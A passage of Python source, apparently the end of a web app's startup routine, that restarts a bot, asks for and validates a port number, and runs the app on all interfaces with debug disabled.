    auto_restart_bot()

    default_port = int(Config.PORT) if hasattr(Config, 'PORT') else 8080
    while True:
        try:
            port_input = input(
                f"Enter port (default {default_port}, press Enter for default): "
            ).strip()
            if port_input == "":
                port = default_port
                break
            port = int(port_input)
            if port < 1 or port > 65535:
                print("Port must be between 1 and 65535.")
                continue
            break
        except ValueError:
            print("Invalid input. Enter a valid port number.")

    _print_startup(port)
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
